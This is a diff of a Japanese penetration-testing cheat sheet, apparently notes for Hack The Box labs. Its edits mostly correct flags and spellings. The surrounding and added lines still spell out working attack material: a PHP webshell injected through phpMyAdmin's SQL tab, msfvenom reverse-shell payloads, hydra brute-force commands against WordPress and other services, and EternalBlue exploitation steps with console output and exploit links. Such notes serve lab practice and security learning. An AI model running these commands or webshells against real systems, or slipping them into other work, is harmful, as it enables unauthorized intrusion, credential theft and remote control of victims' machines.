@@ -551,7 +551,7 @@ wpscan --update
 wpscan --url <url> -e vp #脆弱なプラグイン特定
 wpscan --url <url> -e vt #脆弱なTheme特定
 wpscan --url <url> -e u #ユーザの列挙
-wpscan --url <url> -e u t vp --log <output filename>
+wpscan --url <url> -e u t vp -o <output filename>
 ```
 アグレッシブスキャン
 ```
@@ -562,7 +562,7 @@ wpscan --url <url> -e vp --plugins-detection aggressive
   - u...usernameの列挙
   - vt...脆弱なテーマを列挙
   - vp...脆弱性のあるプラグインを列挙
-- --log...ファイル出力
+- -o...ファイル出力
 
 #### リスト型攻撃/パスワード推測攻撃
 ```
@@ -631,7 +631,10 @@ $databases = array (
 ## phpMyAdmin
 MySQLサーバをWebブラウザで管理するためのデータベース接続ツール。  
 SQL文を記述することなく、MySQLの操作が行える。  
-Wordpressのデータベースを管理できる場合、パスワードの変更などが可能。(MD5)
+WordPressのデータベースを管理できる場合、パスワードの変更などが可能。
+WordPress用のパスワード作成には以下のサイトなどを利用する。  
+https://www.useotools.com/ja/wordpress-password-hash-generator  
+
 phpMyAdminの設定次第ではSQLタブ内に、下記のようなWebshellを埋め込むことが可能。
 ```
 SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {​​system($_GET[\'cmd\']);}​​ ?> </pre></BODY></HTML>"
@@ -1104,8 +1107,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=t
 ### Linux
 ```
 msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.16.4 LPORT=443 -f python
-msfvenom -p linux/x86/shell_reverse_tcp RHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
-msfvenom -p linux/x64/shell_reverse_tcp RHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
 ```
 
@@ -1305,7 +1308,7 @@ hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 mysql
 hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 smb
 ```
 
-### Wordpress
+### WordPress
 ```
 hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 ```
@@ -2571,15 +2574,13 @@ https://github.com/SecWiki/windows-kernel-exploits.git
 エクスプロイトに必要なものを準備。
 この最後のmysmb.pyをダウンロードしておかないと、ImportError：mysmbと警告が出る。
 ```
-wget https://www.exploit-db.com/raw/42315
-mv 42315 eternalblue.py
-wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
+git clone https://github.com/worawit/MS17-010
 ```
 次にimpacketもインストールしておかないと使うことができないので入っていない場合は落としておく。
 ```
 git clone https://github.com/SecureAuthCorp/impacket.git
 cd impacket
-pip install .
+pip2 install .
 ```
 もしもここでpipが入っていないと警告が出た場合は、pipもインストールしておく。
 ```
@@ -2589,8 +2590,8 @@ sudo apt install python-pip
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=1234 -f exe > reverse.exe
 ```
-
-次にeternalblue.pyのソースコードを変更してエクスプロイトに使用できるようにする。  
+zzz_exploit.pyを使用する。  
+次にzzz_exploit.pyのソースコードを変更してエクスプロイトに使用できるようにする。  
 まずUSERNAMEのところを下記の画像のように変更。  
 
 ![](./image/2021-05-06-17-48-11.png)  
@@ -2604,10 +2605,11 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=1234 -f exe > reve
 ```
 nc -lvp 1234
 ```
-最後にeternalblue.pyを実行。
+最後にzzz_exploit.pyを実行。  
+named pipeが必要なため、ここではntsvcsを指定する。
 ```
 ┌─[✗]─[yukitsukai@parrot]─[~/htb/Blue]
-└──╼ $python eternalblue.py 10.10.10.40 ntsvcs
+└──╼ $python2 eternalblue.py 10.10.10.40 ntsvcs
 Target OS: Windows 7 Professional 7601 Service Pack 1
 Target is 64 bit
 Got frag size: 0x10
@@ -2857,6 +2859,10 @@ https://www.exploit-db.com/exploits/18650
 PAM 1.1.0:
 .sshディレクトリの権限を変更しておく(chmod 700 .ssh)
 https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/local/14339.sh
+
+GNU Screen 4.5.0 - Local Privilege Escalation:
+ターゲットマシンのgccでexploit内のコードをコンパイルできない場合、事前にコンパイル作業を攻撃者環境で済ませてlibhax.soとrootshellバイナリを送信し、41154.sh内のスクリプトを順に手動で実行する
+https://www.exploit-db.com/exploits/41154
 ```
 
 ## Initial Shell(Windows)
@@ -2878,6 +2884,9 @@ https://www.exploit-db.com/exploits/44449
 
 Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow:
 https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
+
+Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010):
+https://github.com/worawit/MS17-010
 ```
 
 ## Privilege Escalation(Windows)
